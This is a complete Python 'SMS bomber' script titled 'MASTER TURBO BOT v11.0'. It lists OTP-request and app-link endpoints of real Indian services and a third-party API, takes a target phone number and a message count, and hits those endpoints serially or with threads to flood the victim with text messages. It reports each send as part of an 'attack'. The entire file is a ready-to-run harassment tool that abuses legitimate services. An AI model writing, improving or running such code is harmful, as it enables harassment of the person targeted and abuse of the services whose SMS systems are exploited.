import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

# --- GLOBAL COUNTERS ---
success_count = 0
failed_count = 0

# ---------------------------------------------------------
# API DATABASE (User Provided + Special Lemon Logics)
# ---------------------------------------------------------
SMS_APIS = [
    {"name": "JustDial", "method": "GET", "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php", "params": {"mobile": "{target}"}},
    {"name": "Housing.com", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": "{target}"}},
    {"name": "ConfirmTkt", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/register", "params": {"newOtp": "true", "mobileNumber": "{target}"}},
    {"name": "Porter", "method": "POST", "url": "https://porter.in/restservice/send_app_link_sms", "json": {"phone": "{target}", "brand": "porter"}},
    {"name": "Unacademy", "method": "POST", "url": "https://unacademy.com/api/v1/user/get_app_link/", "json": {"phone": "{target}"}},
    {"name": "Cityflo", "method": "POST", "url": "https://cityflo.com/website-app-download-link-sms/", "data": {"mobile_number": "{target}"}},
    {"name": "3Via", "method": "POST", "url": "https://3via.ly/api/client/login", "json": {"msisdn": "{target}", "device_type": "web"}},
    
    # Special Lemon Logics (GET, POST Query, POST Payload)
    {"name": "Lemon-V1", "method": "GET", "url": "https://sms-api-lemon.vercel.app/api/src", "params": {"number": "{target}"}},
    {"name": "Lemon-V2", "method": "POST", "url": "https://sms-api-lemon.vercel.app/api/src?number={target}", "data": {}},
    {"name": "Lemon-V3", "method": "POST", "url": "https://sms-api-lemon.vercel.app/api/src?number=", "json": {
        "Version": "V1", "Language": "en", "Platform": "web", "ProductId": 1733,
        "MobileNo": "{target}", "OperatorId": "100007", "source": "organic"
    }}
]

def clear():
    os.system("clear")

def banner():
    print(f"{G}========================================")
    print("      🚀 MASTER TURBO BOT v11.0        ")
    print(f"========================================{W}\n")

# --- CORE REQUEST FUNCTION ---
def send_request(api, target):
    global success_count, failed_count
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
    
    try:
        url = api["url"].replace("{target}", target)
        
        params = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None
        json_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("json", {}).items()} if "json" in api else None
        data_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("data", {}).items()} if "data" in api else None

        if api["method"] == "GET":
            response = requests.get(url, params=params, headers=headers, timeout=5)
        else:
            response = requests.post(url, json=json_p, data=data_p, headers=headers, timeout=5)

        if response.status_code == 200:
            success_count += 1
            print(f"{G}[SUCCESS] {api['name']} sent successfully!{W}")
        else:
            failed_count += 1
            print(f"{Y}[-] {api['name']} status: {response.status_code}{W}")

    except Exception:
        failed_count += 1
        print(f"{R}[!] Failed via {api['name']}{W}")

# --- MAIN LOOP ---
def main():
    clear()
    banner()
    
    target = input(f"{G}Enter Target Number: {W}")
    limit = input(f"{G}Enter SMS Limit: {W}")
    
    print(f"\n{Y}Select Mode:")
    print("1. Serial Mode (Safe & Stable)")
    print(f"2. Threading Mode (Turbo Speed - May Lag){W}")
    mode = input("\nChoice: ")

    if not target or not limit:
        print(f"{R}Galti: Target ya Limit empty hai!{W}"); return

    limit = int(limit)
    current_sent = 0

    print(f"\n{G}[*] Launching Attack on {target}...{W}\n")

    if mode == "1":
        # Serial Mode
        while current_sent < limit:
            for api in SMS_APIS:
                if current_sent >= limit: break
                send_request(api, target)
                current_sent += 1
                time.sleep(0.5)
    else:
        # Threading Mode
        threads = []
        while current_sent < limit:
            for api in SMS_APIS:
                if current_sent >= limit: break
                t = threading.Thread(target=send_request, args=(api, target))
                t.start()
                threads.append(t)
                current_sent += 1
                time.sleep(0.1) # Thread gap
            
            for t in threads:
                t.join()

    # --- FINAL DASHBOARD ---
    print(f"\n{G}========================================")
    print(f"           FINAL DASHBOARD")
    print(f"========================================")
    print(f"Target Number : {target}")
    print(f"Total Sent    : {current_sent}")
    print(f"Success       : {success_count}")
    print(f"Failed        : {failed_count}")
    print(f"========================================{W}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{W}")
